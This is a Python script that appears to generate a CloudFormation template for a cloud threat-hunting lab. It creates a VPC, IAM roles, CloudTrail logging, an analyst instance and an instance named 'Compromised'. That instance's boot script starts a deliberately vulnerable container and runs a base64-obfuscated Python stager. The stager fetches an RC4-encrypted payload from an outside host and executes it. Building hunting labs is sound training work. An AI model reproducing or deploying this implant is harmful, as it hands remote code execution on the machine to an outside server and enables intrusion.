#!/usr/bin/python
# -*- coding: utf-8 -*-
# Converted from VPC_With_VPN_Connection.template located at:
# http://aws.amazon.com/cloudformation/aws-cloudformation-templates

#Useful references found here:
# https://github.com/cloudtools/troposphere/blob/master/examples/ApplicationELB.py
# http://boto3.readthedocs.io/en/latest/reference/services/elbv2.html#ElasticLoadBalancingv2.Client.create_target_group
# https://github.com/cloudtools/troposphere/blob/master/examples/Lambda.py

from troposphere import Base64, FindInMap, GetAtt, Join, Output
from troposphere import Parameter, Ref, Tags, Template
from troposphere.ec2 import Route, \
    VPCGatewayAttachment, SubnetRouteTableAssociation, Subnet, RouteTable, \
    VPC, NetworkInterfaceProperty, \
    Instance, InternetGateway, \
    SecurityGroupRule, SecurityGroup, \
    LaunchSpecifications
from troposphere.s3 import BucketPolicy, Bucket
from troposphere.iam import Role, InstanceProfile, Policy
from troposphere.cloudtrail import Trail
import awacs
import awacs.s3 as s3

public_instance_userdata = """#!/bin/bash
echo "START" > /tmp/userdata001.txt
id >> /tmp/userdata001.txt
uname -a >> /tmp/userdata001.txt
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
sudo echo "deb [arch=amd64] https://packages.microsoft.com/repos/azure-cli/ xenial main" > /etc/apt/sources.list.d/azure-cli.list
curl -L https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add -
sudo apt-get update
apt-cache policy docker-ce
sudo apt-get install -y docker-ce
sudo apt-get install -y nmap
sudo apt-get install -y awscli
sudo apt-get install -y python
sudo apt-get install -y python-pip
sudo pip install flask
sudo pip install boto3
sudo apt-get install -y john
sudo apt-get install -y binwalk
sudo apt-get install -y virtualenv
sudo apt-get install -y git
sudo mkdir /shared
sudo git clone https://github.com/cno-io/bh_shared.git /shared
sudo mkdir -p /shared/lists/
sudo mkdir -p /shared/spider/
sudo mkdir -p /shared/lookups/
sudo mkdir -p /root/.aws/
sudo mkdir -p /root/.principalmap/
sudo chmod 700 /shared/lookups/nslookups.sh
sudo chmod 700 /shared/other/bashrc.sh
sudo echo "source /shared/other/bashrc.sh" >> /root/.bashrc
echo "$(ifconfig eth0 | grep 'inet addr' | cut -d: -f2 | awk '{print $1}') $(hostname)" >> /tmp/userdata001.txt
echo "$(ifconfig eth0 | grep 'inet addr' | cut -d: -f2 | awk '{print $1}') $(hostname)" | sudo tee --append /etc/hosts
echo "END" >> /tmp/userdata001.txt
"""

private_instance_userdata = """#!/bin/bash
echo \"START\" > /tmp/userdata001.txt
id >> /tmp/userdata001.txt
uname -a >> /tmp/userdata001.txt
#curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
#sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
#sudo echo "deb [arch=amd64] https://packages.microsoft.com/repos/azure-cli/ xenial main" > /etc/apt/sources.list.d/azure-cli.list
#curl -L https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add -
#sudo apt-get update
#apt-cache policy docker-ce
#sudo apt-get install -y docker-ce
#sudo docker run --restart=always -d -v /home/ubuntu:/home/ubuntu:ro --privileged -p 8080:8080 cnoio/nbvulns001 #SSRF
#sudo docker run --restart=always -d -v /home/ubuntu:/home/ubuntu:ro --privileged -p 5000:5000 cnoio/nbvulns002
#sudo docker run --restart=always -d -p 8000:8000 cnoio/nbvulns003
#sudo docker run --restart=always -d -p 8081:8081 cnoio/nbvulns004
sudo docker run --restart=always -d -v /home/ubuntu:/home/ubuntu:ro --privileged -p 5001:5001 cnoio/nbvulns005
sudo apt-get install -y python
sudo apt-get install -y python-pip
echo "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly9hcGkub210cmlvcmEuY29tOjgwJzt0PScvYWRtaW4vZ2V0LnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPUpHY2JuV0VvcDZ0UzlPbVZyKzZyT2VTWVR4ND0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdO2RhdGE9YVs0Ol07a2V5PUlWKyc5ODU4ODAxY2QwOWM4NjVmMzE4MTc2NTBlZDliNDU2Mic7UyxqLG91dD1yYW5nZSgyNTYpLDAsW10KZm9yIGkgaW4gcmFuZ2UoMjU2KToKICAgIGo9KGorU1tpXStvcmQoa2V5W2klbGVuKGtleSldKSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKG9yZChjaGFyKV5TWyhTW2ldK1Nbal0pJTI1Nl0pKQpleGVjKCcnLmpvaW4ob3V0KSk='));" | /usr/bin/python &
echo "END" >> /tmp/userdata001.txt
"""
#Standard Ubuntu 16 Image
ami_public_mapping = {
    "us-east-2": {"AMI": "ami-6a003c0f"},
}

#Ubuntu 16 image with Docker and Preloaded containers
ami_private_mapping = {
    "us-east-2": {"AMI": "ami-0255fb45a92df418d"},
}

def generate_template(service_name):
    t = Template()
    t.add_version('2010-09-09')

    t.add_description("""\
    AWS CloudFormation Template for AWS Hunt Lab """)

    t.add_mapping("PublicRegionMap", ami_public_mapping)
    t.add_mapping("PrivateRegionMap", ami_private_mapping)

    keyname_param = t.add_parameter(
        Parameter(
            'KeyName',
            ConstraintDescription='must be the name of an existing EC2 KeyPair.',
            Description='Name of an existing EC2 KeyPair to enable SSH access to \
    the instance',
            Type='AWS::EC2::KeyPair::KeyName',
        ))

    sshlocation_param = t.add_parameter(
        Parameter(
            'SSHLocation',
            Description=' The IP address range that can be used to SSH to the EC2 \
    instances',
            Type='String',
            MinLength='9',
            MaxLength='18',
            Default='0.0.0.0/0',
            AllowedPattern="(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/(\d{1,2})",
            ConstraintDescription=(
                "must be a valid IP CIDR range of the form x.x.x.x/x."),
        ))

    instanceType_param = t.add_parameter(Parameter(
        'InstanceType',
        Type='String',
        Description='WebServer EC2 instance type',
        Default='t2.micro',
        AllowedValues=[
            't2.micro', 't2.small', 't2.medium',
            'm3.medium', 'm3.large', 'm3.xlarge', 'm3.2xlarge',
        ],
        ConstraintDescription='must be a valid EC2 instance type.',
    ))

    ref_stack_id = Ref('AWS::StackId')

    ec2_role = t.add_resource(Role(
        "%sEC2Role" % service_name,
        AssumeRolePolicyDocument=awacs.aws.Policy(
            Statement=[
                awacs.aws.Statement(
                    Effect=awacs.aws.Allow,
                    Action=[awacs.aws.Action("sts", "AssumeRole")],
                    Principal=awacs.aws.Principal("Service", ["ec2.amazonaws.com"])
                )
            ]
        )
    ))
    ec2_role.ManagedPolicyArns = [
        "arn:aws:iam::aws:policy/ReadOnlyAccess"
    ]

    ec2_snapshot_policy_document = awacs.aws.Policy(
        Statement=[
            awacs.aws.Statement(
                Sid="PermitEC2Snapshots",
                Effect=awacs.aws.Allow,
                Action=[
                    awacs.aws.Action("ec2", "CreateSnapshot"),
                    awacs.aws.Action("ec2", "ModifySnapshotAttribute"),
                ],
                Resource=["*"]
            )
        ]
    )

    ec2_snapshot_policy = Policy(
        PolicyName="EC2SnapshotPermissions",
        PolicyDocument=ec2_snapshot_policy_document
    )

    priv_ec2_role = t.add_resource(Role(
        "%sPrivEC2Role" % service_name,
        AssumeRolePolicyDocument=awacs.aws.Policy(
            Statement=[
                awacs.aws.Statement(
                    Effect=awacs.aws.Allow,
                    Action=[awacs.aws.Action("sts", "AssumeRole")],
                    Principal=awacs.aws.Principal("Service", ["ec2.amazonaws.com"])
                )
            ]
        ),
        Policies=[ec2_snapshot_policy]
    ))

    priv_ec2_role.ManagedPolicyArns = [
        "arn:aws:iam::aws:policy/ReadOnlyAccess"
    ]

    VPC_ref = t.add_resource(
        VPC(
            'VPC',
            CidrBlock='10.0.0.0/16',
            Tags=Tags(
                Application=ref_stack_id)))

    instanceProfile = t.add_resource(
        InstanceProfile(
            "InstanceProfile",
            InstanceProfileName="%sInstanceRole" % (service_name),
            Roles=[Ref(ec2_role)]))

    privInstanceProfile = t.add_resource(
        InstanceProfile(
            "PrivInstanceProfile",
            InstanceProfileName="%sPrivInstanceRole" % (service_name),
            Roles=[Ref(priv_ec2_role)]))

    public_subnet = t.add_resource(
        Subnet(
            '%sSubnetPublic' % service_name,
            MapPublicIpOnLaunch=True,
            CidrBlock='10.0.1.0/24',
            VpcId=Ref(VPC_ref),
            Tags=Tags(
                Application=ref_stack_id,
                Name="%sSubnet_public" % (service_name))
        )
    )

    private_subnet = t.add_resource(
        Subnet(
            '%sSubnetPrivate' % service_name,
            MapPublicIpOnLaunch=False,
            CidrBlock='10.0.2.0/24',
            VpcId=Ref(VPC_ref),
            Tags=Tags(
                Application=ref_stack_id,
                Name="%sSubnet_private" % (service_name))
        )
    )

    internetGateway = t.add_resource(
        InternetGateway(
            'InternetGateway',
            Tags=Tags(
                Application=ref_stack_id,
                Name="%sInternetGateway" % service_name)))

    gatewayAttachment = t.add_resource(
        VPCGatewayAttachment(
            'AttachGateway',
            VpcId=Ref(VPC_ref),
            InternetGatewayId=Ref(internetGateway)))

    routeTable = t.add_resource(
        RouteTable(
            'RouteTable',
            VpcId=Ref(VPC_ref),
            Tags=Tags(
                Application=ref_stack_id,
                Name="%sRouteTable" % service_name)))

    route = t.add_resource(
        Route(
            'Route',
            DependsOn='AttachGateway',
            GatewayId=Ref('InternetGateway'),
            DestinationCidrBlock='0.0.0.0/0',
            RouteTableId=Ref(routeTable),
        ))

    # Only associate this Route Table with the public subnet
    subnetRouteTableAssociation = t.add_resource(
        SubnetRouteTableAssociation(
            'SubnetRouteTableAssociation',
            SubnetId=Ref(public_subnet),
            RouteTableId=Ref(routeTable),
        ))

    instanceSecurityGroup = t.add_resource(
        SecurityGroup(
            'InstanceSecurityGroup',
            GroupDescription='%sSecurityGroup' % service_name,
            SecurityGroupIngress=[
                SecurityGroupRule(
                    IpProtocol='tcp',
                    FromPort='22',
                    ToPort='22',
                    CidrIp=Ref(sshlocation_param)),
                SecurityGroupRule(
                    IpProtocol='tcp',
                    FromPort='80',
                    ToPort='80',
                    CidrIp='0.0.0.0/0'),
                SecurityGroupRule(
                    IpProtocol='tcp',
                    FromPort='8080',
                    ToPort='8080',
                    CidrIp='0.0.0.0/0'),
                SecurityGroupRule(
                    IpProtocol='tcp',
                    FromPort='8000',
                    ToPort='8000',
                    CidrIp='0.0.0.0/0'),
                SecurityGroupRule(
                    IpProtocol='tcp',
                    FromPort='5000',
                    ToPort='5000',
                    CidrIp='0.0.0.0/0'),
                SecurityGroupRule(
                    IpProtocol='tcp',
                    FromPort='5001',
                    ToPort='5001',
                    CidrIp='0.0.0.0/0'),
                SecurityGroupRule(
                    IpProtocol='tcp',
                    FromPort='8081',
                    ToPort='8081',
                    CidrIp='0.0.0.0/0'),
                SecurityGroupRule(
                    IpProtocol='tcp',
                    FromPort='1080',
                    ToPort='1080',
                    CidrIp='0.0.0.0/0'),
                SecurityGroupRule(
                    IpProtocol='tcp',
                    FromPort='443',
                    ToPort='443',
                    CidrIp='0.0.0.0/0'),
                SecurityGroupRule(
                    IpProtocol='tcp',
                    FromPort='0',
                    ToPort='65535',
                    CidrIp="10.0.0.0/8"),
            ],
            VpcId=Ref(VPC_ref),
        )
    )

    public_instance = t.add_resource(
        Instance(
            "Public%sInstance" % service_name,
            ImageId=FindInMap("PublicRegionMap", Ref("AWS::Region"), "AMI"),
            InstanceType=Ref(instanceType_param),
            KeyName=Ref(keyname_param),
            NetworkInterfaces=[
                NetworkInterfaceProperty(
                    GroupSet=[
                        Ref(instanceSecurityGroup)],
                    AssociatePublicIpAddress='true',
                    DeviceIndex='0',
                    DeleteOnTermination='true',
                    SubnetId=Ref(public_subnet))],
            UserData=Base64(public_instance_userdata),
            Tags=Tags(
                Application=ref_stack_id,
                Name='%sPublicInstance' % (service_name))
        )
    )

    private_instance = t.add_resource(
        Instance(
            "Compromised%sInstance" % service_name,
            ImageId=FindInMap("PrivateRegionMap", Ref("AWS::Region"), "AMI"),
            InstanceType=Ref(instanceType_param),
            KeyName=Ref(keyname_param),
            NetworkInterfaces=[
                NetworkInterfaceProperty(
                    GroupSet=[
                        Ref(instanceSecurityGroup)],
                    DeviceIndex='0',
                    DeleteOnTermination='true',
                    SubnetId=Ref(public_subnet))],
            UserData=Base64(private_instance_userdata),
            Tags=Tags(
                Application=ref_stack_id,
                Name='%sCompromisedInstance' % (service_name)),
            IamInstanceProfile="%sPrivInstanceRole" % (service_name)
        )
    )

    outputs = []
    outputs.append(
        Output(
            "PublicIP",
            Description="IP Address of the Compromised Instance",
            Value=GetAtt(private_instance, "PublicIp"),
        )
    )
    t.add_output(outputs)

    # Set up S3 Bucket and CloudTrail
    S3Bucket = t.add_resource(
        Bucket(
            "S3Bucket",
            DeletionPolicy="Retain"
        )
    )

    S3PolicyDocument=awacs.aws.PolicyDocument(
        Id='EnforceServersideEncryption',
        Version='2012-10-17',
        Statement=[
            awacs.aws.Statement(
                Sid='PermitCTBucketPut',
                Action=[s3.PutObject],
                Effect=awacs.aws.Allow,
                Principal=awacs.aws.Principal("Service", ["cloudtrail.amazonaws.com"]),
                Resource=[Join('', [s3.ARN(''), Ref(S3Bucket), "/*"])],
            ),
            awacs.aws.Statement(
                Sid='PermitCTBucketACLRead',
                Action=[s3.GetBucketAcl],
                Effect=awacs.aws.Allow,
                Principal=awacs.aws.Principal("Service", ["cloudtrail.amazonaws.com"]),
                Resource=[Join('', [s3.ARN(''), Ref(S3Bucket)])],
            )
        ]
    )

    S3BucketPolicy = t.add_resource(
        BucketPolicy(
            "BucketPolicy",
            PolicyDocument=S3PolicyDocument,
            Bucket=Ref(S3Bucket),
            DependsOn=[S3Bucket]
        )
    )

    myTrail = t.add_resource(
        Trail(
            "CloudTrail",
            IsLogging=True,
            S3BucketName=Ref(S3Bucket),
            DependsOn=["BucketPolicy"],
        )
    )
    myTrail.IsMultiRegionTrail = True
    myTrail.IncludeGlobalServiceEvents = True
    return t.to_json()


def lambda_handler(event, context):
    # Prep the AZ & Region info for mapping
    # This is required because you can't iterate over AZs within a template.

    # input_region = raw_input("Specify AWS Region: ")
    # input_region = "us-east-1"
    service_name = "ctfhunt001"
    template = generate_template(service_name)
    outfile = "ctfhunt001_template.json"
    output = open(outfile, "w+")
    output.write(template)
    print "Wrote to %s" % outfile
    output.close()

lambda_handler(None, None)


